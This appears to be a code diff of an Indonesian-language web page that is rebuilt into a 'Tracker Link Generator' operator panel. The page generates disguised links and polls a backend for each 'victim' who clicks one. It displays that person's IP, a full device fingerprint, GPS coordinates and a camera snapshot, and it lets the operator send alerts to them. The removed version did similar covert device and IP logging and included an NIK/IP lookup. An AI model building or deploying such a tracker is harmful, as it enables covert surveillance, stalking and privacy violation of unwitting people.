@@ -1,211 +1,328 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Dashboard Edukasi Tracker</title>
-<style>
-body { font-family: Arial; margin:0; padding:20px; background:#0d1117; color:#c9d1d9; }
-h1,h2 { text-align:center; color:#00ffcc; }
-.container { display:flex; flex-wrap:wrap; justify-content:center; }
-.card { background:#161b22; padding:20px; border-radius:10px; margin:10px; width:400px; }
-input, button { width:100%; padding:10px; margin:5px 0; border-radius:8px; border:none; }
-button { background:#00ffcc; color:#111; font-weight:bold; cursor:pointer; }
-pre { background:#111; padding:10px; border-radius:8px; max-height:300px; overflow:auto; white-space:pre-wrap; }
-.hidden { display:none; }
-.server-status { font-weight:bold; margin-top:10px; }
-.error { color:red; text-align:center; }
-a { color:#00ffcc; }
-</style>
+  <meta charset="UTF-8" />
+  <title>🎯 Tracker Link Generator (Live)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <style>
+    /* ===== GENERAL ===== */
+    body {
+      background: #0b0c10;
+      color: #e0e0e0;
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+
+    h2 {
+      color: #f5f5f5;
+      text-align: center;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    input, button {
+      padding: 12px 16px;
+      border-radius: 12px;
+      font-size: 16px;
+      border: none;
+      margin-bottom: 12px;
+      width: 100%;
+      box-sizing: border-box;
+      transition: all 0.2s ease;
+    }
+
+    input {
+      background: #1f2833;
+      color: #e0e0e0;
+      border: 1px solid #45a29e;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #66fcf1;
+      box-shadow: 0 0 8px #66fcf1;
+    }
+
+    button {
+      background: linear-gradient(90deg, #45a29e, #66fcf1);
+      color: #0b0c10;
+      font-weight: 600;
+      cursor: pointer;
+      border: 1px solid #45a29e;
+    }
+
+    button:hover {
+      background: linear-gradient(90deg, #66fcf1, #45a29e);
+      color: #0b0c10;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+
+    .container {
+      width: 100%;
+      max-width: 520px;
+      background: #1c1c1c;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.6);
+    }
+
+    .link-result {
+      font-size: 14px;
+      margin: 15px 0;
+      word-break: break-word;
+      padding: 10px;
+      background: #16202c;
+      border-radius: 12px;
+      border: 1px solid #45a29e;
+    }
+
+    .link-result a {
+      color: #66fcf1;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .victim-box {
+      margin-top: 20px;
+      background: #16202c;
+      border-radius: 16px;
+      padding: 18px;
+      font-size: 14px;
+      border: 1px solid #45a29e;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+      white-space: pre-wrap;
+    }
+
+    .victim-box h3 {
+      margin-bottom: 12px;
+      font-size: 18px;
+      color: #66fcf1;
+      font-weight: 600;
+    }
+
+    img.snapshot {
+      max-width: 100%;
+      border-radius: 12px;
+      margin-top: 12px;
+      border: 1px solid #45a29e;
+    }
+
+    #loginBox p {
+      margin-top: -8px;
+      font-size: 14px;
+    }
+
+  </style>
 </head>
 <body>
+  <div class="container">
 
-<div class="container">
+    <!-- LOGIN -->
+    <div id="loginBox">
+      <h2>🔐 Login</h2>
+      <input type="text" id="username" placeholder="Username" />
+      <input type="password" id="password" placeholder="Password" />
+      <button onclick="login()">Login</button>
+      <p id="loginMsg" style="color:#ff6b6b;"></p>
+    </div>
 
-<!-- LOGIN -->
-<div class="card" id="loginCard">
-<h2>Login</h2>
-<input type="text" id="username" placeholder="Username">
-<input type="password" id="password" placeholder="Password">
-<button onclick="login()">Login</button>
-<p class="error" id="errorMsg"></p>
-</div>
+    <!-- KONTEN UTAMA (disembunyikan sebelum login) -->
+    <div id="mainContent" style="display:none;">
+      <h2>🎯 Tracker Link Generator</h2>
 
-<!-- ADMIN DASHBOARD -->
-<div class="card hidden" id="adminDashboard">
-<h1>Admin Dashboard</h1>
+      <form onsubmit="generateLink(event)">
+        <input type="url" id="target" placeholder="https://example.com" required />
+        <button type="submit">Generate Link</button>
+      </form>
 
-<div class="section">
-<h2>Tracker Link Generator</h2>
-<input type="text" id="targetUrlAdmin" placeholder="Masukkan URL target">
-<button onclick="generateTrackerAdmin()">Generate Link</button>
-<p id="generatedLinkAdmin"></p>
-<h3>Log Tracking</h3>
-<pre id="logAdmin">Belum ada data...</pre>
-</div>
+      <form onsubmit="sendCustomAlert(event)">
+        <input type="text" id="customMsg" placeholder="📢 Pesan alert ke korban..." />
+        <button type="submit">Kirim Alert</button>
+      </form>
 
-<div class="section">
-<h2>Lookup NIK & Track IP</h2>
-<input type="text" id="nikOrIpAdmin" placeholder="Masukkan NIK atau IP">
-<button onclick="lookupAdmin()">Cari Data</button>
-<pre id="lookupResultAdmin"></pre>
-</div>
+      <div class="link-result" id="generatedLink"></div>
 
-<div class="section">
-<h2>Kontrol Server Member</h2>
-<button onclick="toggleServer()">Matikan / Nyalakan Server</button>
-<p class="server-status" id="serverStatus">Server: Nyala</p>
-</div>
+      <div id="resultBox" class="victim-box" style="display: none;">
+        <h3>✅ Victim Information</h3>
+        <div id="resultOutput">Menunggu korban...</div>
+        <div id="mapBox" style="margin-top:10px;"></div>
+        <div id="imgBox" style="margin-top:10px;"></div>
+      </div>
+    </div>
+  </div>
 
-<button style="margin-top:20px;background:#dc3545;" onclick="logout()">Logout</button>
-</div>
+  <script>
+    // ===== LOGIN =====
+    const validUsers = [
+      { user: "admin", pass: "1234" },
+      { user: "putra", pass: "putra123" }
+    ];
 
-<!-- MEMBER DASHBOARD -->
-<div class="card hidden" id="memberDashboard">
-<h1>Member Dashboard</h1>
+    function login() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const msgBox = document.getElementById("loginMsg");
 
-<div class="section">
-<h2>Tracker Link Generator</h2>
-<input type="text" id="targetUrlMember" placeholder="Masukkan URL target">
-<button onclick="generateTrackerMember()">Generate Link</button>
-<p id="generatedLinkMember"></p>
-<h3>Log Tracking</h3>
-<pre id="logMember">Belum ada data...</pre>
-</div>
+      const valid = validUsers.find(u => u.user === username && u.pass === password);
+      if (valid) {
+        msgBox.textContent = "✅ Login berhasil!";
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("mainContent").style.display = "block";
+      } else {
+        msgBox.textContent = "❌ Username atau password salah!";
+      }
+    }
 
-<div class="section">
-<h2>Lookup NIK & Track IP</h2>
-<input type="text" id="nikOrIpMember" placeholder="Masukkan NIK atau IP">
-<button onclick="lookupMember()">Cari Data</button>
-<pre id="lookupResultMember"></pre>
-</div>
+    // ===== TRACKER =====
+    let currentCode = null;
+    let fetched = false;
 
-<button style="margin-top:20px;background:#dc3545;" onclick="logout()">Logout</button>
-</div>
+    function generateLink(e) {
+      e.preventDefault();
+      const input = document.getElementById("target").value.trim();
+      if (!input) return;
 
-</div>
+      const code = Math.random().toString(36).substring(2, 10);
+      currentCode = code;
+      const link = `${window.location.origin}/track/${code}?id=${code}`;
 
-<script>
-// USERS
-const users = [
-  { username:"admin", password:"admin123", role:"admin" },
-  { username:"member", password:"member123", role:"member" }
-];
+      document.getElementById("generatedLink").innerHTML = `🔗 <a href="${link}" target="_blank">${link}</a>`;
+      document.getElementById("resultOutput").textContent = "Menunggu korban...";
+      document.getElementById("resultBox").style.display = "block";
 
-let serverRunning = true;
+      fetch("/log-tracker-link", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          id: code,
+          redirect_to: input,
+          created_at: new Date().toISOString()
+        })
+      });
 
-// LOGIN / LOGOUT
-function login(){
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
-  const user = users.find(u=>u.username===username && u.password===password);
-  const errorMsg = document.getElementById('errorMsg');
-  if(user){
-    document.getElementById('loginCard').classList.add('hidden');
-    errorMsg.textContent="";
-    if(user.role==="admin") document.getElementById('adminDashboard').classList.remove('hidden');
-    else document.getElementById('memberDashboard').classList.remove('hidden');
-  } else {
-    errorMsg.textContent="Username atau password salah!";
-  }
-}
-function logout(){
-  document.getElementById('loginCard').classList.remove('hidden');
-  document.getElementById('adminDashboard').classList.add('hidden');
-  document.getElementById('memberDashboard').classList.add('hidden');
-  document.getElementById('username').value="";
-  document.getElementById('password').value="";
-}
+      pollVictimLogs();
+    }
 
-// SERVER CONTROL
-function toggleServer(){
-  serverRunning=!serverRunning;
-  document.getElementById('serverStatus').textContent="Server: "+(serverRunning?"Nyala":"Mati");
-  alert("Server member sekarang "+(serverRunning?"Nyala":"Mati"));
-}
+    function pollVictimLogs() {
+      if (!currentCode || fetched) return;
+      setInterval(async () => {
+        const res = await fetch("/get-tracker-logs");
+        const logs = await res.json();
+        const victim = logs.find(v => v.tracker_id === currentCode);
+        if (victim) {
+          fetched = true;
+          renderFullResult(victim);
+        }
+      }, 3000);
+    }
 
-// --- Tracker Link Generator ---
-function generateTrackerAdmin(){
-  let url = document.getElementById("targetUrlAdmin").value.trim();
-  if(!url) return alert("Isi URL!");
-  let trackerUrl = window.location.href.split("?")[0]+"?redirect="+encodeURIComponent(url)+"&role=admin";
-  document.getElementById("generatedLinkAdmin").innerHTML = `<a href="${trackerUrl}" target="_blank">${trackerUrl}</a>`;
-}
+    function renderFullResult(v) {
+      const result = `
+⚓ IP: ${v.ip} | Time: ${v.access_time}
+⏳ Date In Victim's Device : ${v.local_time}
 
-function generateTrackerMember(){
-  let url = document.getElementById("targetUrlMember").value.trim();
-  if(!url) return alert("Isi URL!");
-  let trackerUrl = window.location.href.split("?")[0]+"?redirect="+encodeURIComponent(url)+"&role=member";
-  document.getElementById("generatedLinkMember").innerHTML = `<a href="${trackerUrl}" target="_blank">${trackerUrl}</a>`;
-}
+📱 DEVICE OVERVIEW
+📲 Device Name: ${v.user_agent}
+💻 Operating System: ${parseOS(v.user_agent)}
+🌐 Browser: ${parseBrowser(v.user_agent)}
+🔧 Platform: ${v.platform || 'N/A'}
 
-// --- Ambil Device Info ---
-async function getDeviceInfo(targetUrl, roleText){
-  let v = {};
-  v.url = targetUrl;
-  v.role = roleText;
-  v.user_agent = navigator.userAgent;
-  v.platform = navigator.platform;
-  v.screen = `${screen.width}x${screen.height}`;
-  v.window = `${window.innerWidth}x${window.innerHeight}`;
-  v.cpu = navigator.hardwareConcurrency || "N/A";
-  v.ram = navigator.deviceMemory || "N/A";
-  v.language = navigator.language;
-  v.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  try{ const battery = await navigator.getBattery(); v.battery = { level:(battery.level*100)+"%", charging:battery.charging?"Ya":"Tidak"}; } catch{ v.battery={level:"N/A", charging:"N/A"}; }
-  try{ const ipData = await fetch('https://ipapi.co/json/').then(r=>r.json()); v.ip = ipData.ip; v.kota=ipData.city; v.provinsi=ipData.region; v.negara=ipData.country_name; } catch{}
-  v.time = new Date().toLocaleString();
-  return v;
-}
+🖥️ DISPLAY DETAILS
+📐 Screen Size: ${v.screen}
+🪟 Window Size: ${v.window}
+🎨 Color Quality: 24-bit
+🔄 Orientation: ${v.orientation || 'unknown'}
+📊 Pixel Density: ${v.dpr}x
 
-// --- Simpan Log ---
-function saveLog(info){
-  let logs = JSON.parse(localStorage.getItem("trackerLogs")||"[]");
-  logs.push(info);
-  localStorage.setItem("trackerLogs", JSON.stringify(logs));
-}
+⚡ PERFORMANCE INFO
+🧠 CPU Cores: ${v.cpu}
+💾 Device RAM: ${v.ram}
+🌍 Language: ${v.language}
+🕐 Timezone: ${v.timezone}
 
-// --- Tampilkan Log ---
-function showLogs(role){
-  let logs = JSON.parse(localStorage.getItem("trackerLogs")||"[]");
-  logs = logs.filter(l=>l.role===role);
-  let text="";
-  logs.forEach((v,i)=>{
-    text+=`[${i+1}] ${v.time}\n📲 Device: ${v.user_agent}\n🔧 Platform: ${v.platform}\n📐 Screen: ${v.screen}\n🧠 CPU: ${v.cpu}\n💾 RAM: ${v.ram}\n🌍 Language: ${v.language}\n🕐 Timezone: ${v.timezone}\n🔋 Battery: ${v.battery.level}, Charging: ${v.battery.charging}\nIP: ${v.ip || 'N/A'}, Kota: ${v.kota || 'N/A'}, Provinsi: ${v.provinsi || 'N/A'}, Negara: ${v.negara || 'N/A'}\n➡️ Redirect: ${v.url}\n------------------------------------------------\n`;
-  });
-  if(role==="admin") document.getElementById("logAdmin").innerText=text||"Belum ada data...";
-  else document.getElementById("logMember").innerText=text||"Belum ada data...";
-}
+👆 INPUT CAPABILITIES
+📱 Touch Screen: ✅ ${v.touch ? 'Yes' : 'No'}
+🖐️ Max Touch Points: ${v.maxTouchPoints || 'N/A'}
+🍪 Cookies: ✅ ${v.cookies ? 'Enabled' : 'Disabled'}
+🌐 Online Status: ✅ ${v.online ? 'Connected' : 'Disconnected'}
 
-// --- Cek parameter redirect ---
-const params = new URLSearchParams(window.location.search);
-if(params.has("redirect") && params.has("role")){
-  const target = params.get("redirect");
-  const role = params.get("role");
-  getDeviceInfo(target, role).then(info=>{
-    saveLog(info);
-    showLogs(role);
-    setTimeout(()=>{ window.location.href = target; },1500);
-  });
-}
+🔒 SECURITY FEATURES
+🚫 Do Not Track: ${v.doNotTrack === '1' ? '✅ Enabled' : '❌ Disabled'}
+🤖 Webdriver: ${v.webdriver ? '❌ Detected' : '✅ Not Detected'}
+📄 PDF Viewer: ${v.pdfViewerEnabled ? '✅ Available' : '❌ Not Available'}
 
-// --- Lookup NIK legal ---
-function lookupAdmin(){ lookupData('admin'); }
-function lookupMember(){ lookupData('member'); }
-function lookupData(role){
-  const val = role==='admin'?document.getElementById('nikOrIpAdmin').value:document.getElementById('nikOrIpMember').value;
-  const output = role==='admin'?document.getElementById('lookupResultAdmin'):document.getElementById('lookupResultMember');
-  if(!val) return alert("Isi NIK atau IP!");
-  if(/^\d{16}$/.test(val)){
-    output.textContent = JSON.stringify({NIK:val,tanggal_lahir:"01-01-2000",kota:"Bandung"},null,2);
-  } else {
-    fetch(`http://ip-api.com/json/${val}`)
-      .then(res=>res.json())
-      .then(data=>{ output.textContent = JSON.stringify({IP:data.query,negara:data.country,provinsi:data.regionName,kota:data.city,isp:data.isp,lat:data.lat,lon:data.lon,timezone:data.timezone},null,2); })
-      .catch(()=>{ output.textContent="Gagal mengambil data IP."; });
-  }
-}
-</script>
+📷 Media Device Information
+Audio Input Devices: ${v.audioIn || 0}
+Video Input Devices: ${v.videoIn || 0}
+Audio Output Devices: ${v.audioOut || 0}
 
+📶 NETWORK CONNECTION
+🚀 Connection Type: ${v.connection?.type || 'N/A'}
+🔗 Network Type: ${v.connection?.effectiveType || 'N/A'}
+⬇️ Download Speed: ${v.connection?.downlink || 'N/A'} Mbps
+💾 Data Saver: ${v.connection?.saveData ? '✅ Enabled' : '❌ Disabled'}
+
+🧠 MEMORY USAGE
+📊 Memory Used: ${v.memoryUsed || 'N/A'}
+📈 Total Allocated: ${v.memoryAllocated || 'N/A'}
+🚧 Memory Limit: ${v.memoryLimit || 'N/A'}
+
+🔋 BATTERY STATUS
+🔋 Battery Level: ${v.battery?.level || 'N/A'}
+⚡ Charging Status: ${v.battery?.charging || 'N/A'}
+      `;
+
+      document.getElementById("resultOutput").textContent = result;
+
+      if (v.location?.lat && v.location?.lon) {
+        document.getElementById("mapBox").innerHTML = `
+<h3>📍 Location</h3>
+📍 Latitude: ${v.location.lat}<br>
+📍 Longitude: ${v.location.lon}<br>
+🌐 <a href="https://maps.google.com/?q=${v.location.lat},${v.location.lon}" target="_blank">Google Maps</a>`;
+      } else {
+        document.getElementById("mapBox").innerHTML = `
+<h3>📍 Location</h3>
+🚫 Permission Denied or Unavailable`;
+      }
+
+      document.getElementById("imgBox").innerHTML = `
+<h3>📷 Snapshot</h3>
+<img class="snapshot" src="/static/shots/${v.tracker_id}.jpg?${Date.now()}" alt="snapshot korban">`;
+    }
+
+    function parseOS(ua) {
+      if (ua.includes("Android")) return "Android";
+      if (ua.includes("iPhone")) return "iOS";
+      if (ua.includes("Windows")) return "Windows";
+      if (ua.includes("Mac OS")) return "macOS";
+      return "Unknown";
+    }
+
+    function parseBrowser(ua) {
+      if (ua.includes("Chrome")) return "Chrome";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Safari")) return "Safari";
+      if (ua.includes("Edg")) return "Edge";
+      return "Unknown";
+    }
+
+    function sendCustomAlert(e) {
+      e.preventDefault();
+      const msg = document.getElementById("customMsg").value.trim();
+      if (!msg || !currentCode) return;
+
+      fetch(`/send-alert/${currentCode}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ message: msg })
+      }).then(() => alert("📢 Alert dikirim ke korban."));
+    }
+  </script>
 </body>
 </html>
